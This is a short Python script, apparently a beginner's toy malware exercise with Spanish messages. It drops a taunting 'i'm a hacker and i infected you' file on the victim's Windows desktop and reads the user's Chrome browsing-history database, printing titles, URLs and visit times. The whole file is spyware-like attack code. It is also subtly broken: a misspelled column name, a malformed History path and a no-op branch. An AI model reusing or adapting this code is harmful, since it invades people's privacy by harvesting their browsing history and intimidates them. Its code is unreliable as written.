import os
import sqlite3
from time import sleep
from random import randrange


HACK_FILE_NAME = "For you.txt"


def delay_actions():
    n_hours = randrange(1, 4)
    n_minutes = randrange(1, 11)
    print(f"durmiendo {n_hours} horas y {n_minutes} minuto(s)")
    #sleep(n_hours * 60 + n_minutes * 60)

def create_hack_file(user_path):
    h4cker_file = open(user_path + "\\desktop\\" + HACK_FILE_NAME, "w")
    h4cker_file.write("i'm a hacker and i infected you")
    return h4cker_file

def get_chrome_history(user_path):
    last_attempts = 5
    attempts = 0
    while attempts < last_attempts:
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\\"
            conecction = sqlite3.connect(history_path)
            cursor = conecction.cursor()
            cursor.execute("SELECT title, las_visit_time, url FROM urls ORDER BY las_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            conecction.close()
            return urls
        except sqlite3.OperationalError:
            print("no hemos conseguido el archivo, lo intentaremos de nuevo")
            attempts += 1
            if attempts < last_attempts:
                sleep(2)
            elif attempts >= last_attempts:
                print("hemos superado el numero de intentos, no hemos recuperado el archivo")
    return None

def main():
    delay_actions()
    user_path = "C:\\Users\\" + os.getlogin()
    if user_path == os.path.expanduser("~"):
        print("ruta correcta")
    else:
        os.path.expanduser("~") + "\\desktop\\"
        print(user_path)
    h4cker_file = create_hack_file(user_path)
    chrome_history = get_chrome_history(user_path)
    print(chrome_history)


if __name__ == "__main__":
    main()